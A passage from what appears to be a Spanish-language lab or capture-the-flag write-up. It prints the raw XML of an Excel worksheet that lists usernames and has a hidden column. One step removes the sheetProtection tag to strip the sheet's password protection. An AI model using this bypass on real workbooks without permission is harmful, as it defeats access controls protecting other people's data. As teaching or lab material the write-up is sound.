class="s2">"A6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;12&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;13&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C6"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;36&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Scarlett.Parks&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"7"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;14&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;15&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;37&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Eliezer.Jordan&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"8"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;16&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;17&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;38&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">ref</span><span class="o">=</span><span class="s2">"D8:D15"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span><span class="o">&gt;</span>A8&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B8&lt;/f&gt;&lt;v&gt;Hunter.Kirby&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;29&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;30&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C9"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;48&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f&gt;A9&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B9&lt;/f&gt;&lt;v&gt;Sierra.Frye&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"10"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;18&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;19&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C10"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;39&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Annabelle.Wells&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"11"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;20&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;21&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;40&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Eve.Galvan&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"12"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;22&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;23&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;41&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Jeramiah.Fritz&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"13"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;24&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;25&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;42&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Abby.Gonzalez&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"14"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;26&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;11&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;43&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Joy.Costa&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"15"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;27&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;28&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;47&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Vincent.Sutton&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"17"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"3:3"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C17"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"4"</span>/&gt;&lt;/row&gt;&lt;/sheetData&gt;&lt;sheetProtection <span class="nv">algorithmName</span><span class="o">=</span><span class="s2">"SHA-512"</span> <span class="nv">hashValue</span><span class="o">=</span><span class="s2">"hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg=="</span> <span class="nv">saltValue</span><span class="o">=</span><span class="s2">"U9oZfaVCkz5jWdhs9AA8nA=="</span> <span class="nv">spinCount</span><span class="o">=</span><span class="s2">"100000"</span> <span class="nv">sheet</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">objects</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">scenarios</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;pageMargins <span class="nv">left</span><span class="o">=</span><span class="s2">"0.7"</span> <span class="nv">right</span><span class="o">=</span><span class="s2">"0.7"</span> <span class="nv">top</span><span class="o">=</span><span class="s2">"0.75"</span> <span class="nv">bottom</span><span class="o">=</span><span class="s2">"0.75"</span> <span class="nv">header</span><span class="o">=</span><span class="s2">"0.3"</span> <span class="nv">footer</span><span class="o">=</span><span class="s2">"0.3"</span>/&gt;&lt;pageSetup <span class="nv">paperSize</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">orientation</span><span class="o">=</span><span class="s2">"portrait"</span> r:id<span class="o">=</span><span class="s2">"rId1"</span>/&gt;&lt;/worksheet&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a eliminar la etiqueta <code class="language-plaintext highlighter-rouge">sheetProtection</code> para que quede así.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document <span class="nb">cat </span>xl/worksheets/sheet2.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">"yes"</span>?&gt;
&lt;worksheet <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/spreadsheetml/2006/main"</span> xmlns:r<span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span> xmlns:mc<span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span> mc:Ignorable<span class="o">=</span><span class="s2">"x14ac xr xr2 xr3"</span> xmlns:x14ac<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac"</span> xmlns:xr<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2014/revision"</span> xmlns:xr2<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2015/revision2"</span> xmlns:xr3<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2016/revision3"</span> xr:uid<span class="o">=</span><span class="s2">"{00000000-0001-0000-0100-000000000000}"</span><span class="o">&gt;</span>&lt;dimension <span class="nv">ref</span><span class="o">=</span><span class="s2">"A1:D17"</span>/&gt;&lt;sheetViews&gt;&lt;sheetView <span class="nv">tabSelected</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">workbookViewId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>&lt;selection <span class="nv">activeCell</span><span class="o">=</span><span class="s2">"F19"</span> <span class="nv">sqref</span><span class="o">=</span><span class="s2">"F19"</span>/&gt;&lt;/sheetView&gt;&lt;/sheetViews&gt;&lt;sheetFormatPr <span class="nv">defaultRowHeight</span><span class="o">=</span><span class="s2">"15"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span>/&gt;&lt;cols&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"10.140625"</span> <span class="nv">bestFit</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"37.5703125"</span> <span class="nv">hidden</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"19.140625"</span> <span class="nv">bestFit</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;/cols&gt;&lt;sheetData&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;0&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;1&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;2&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;31&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;3&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;4&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;44&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">ref</span><span class="o">=</span><span class="s2">"D2:D7"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>A2&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B2&lt;/f&gt;&lt;v&gt;Payton.Harmon&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;5&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;6&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;45&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Cortez.Hickman&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;7&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;8&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;46&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Bobby.Wolf&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"5"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;9&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;10&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;35&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Margaret.Robinson&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"6"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;12&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;13&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C6"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;36&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Scarlett.Parks&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"7"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;14&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;15&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;37&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Eliezer.Jordan&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"8"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;16&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;17&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;38&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">ref</span><span class="o">=</span><span class="s2">"D8:D15"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span><span class="o">&gt;</span>A8&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B8&lt;/f&gt;&lt;v&gt;Hunter.Kirby&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;29&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span 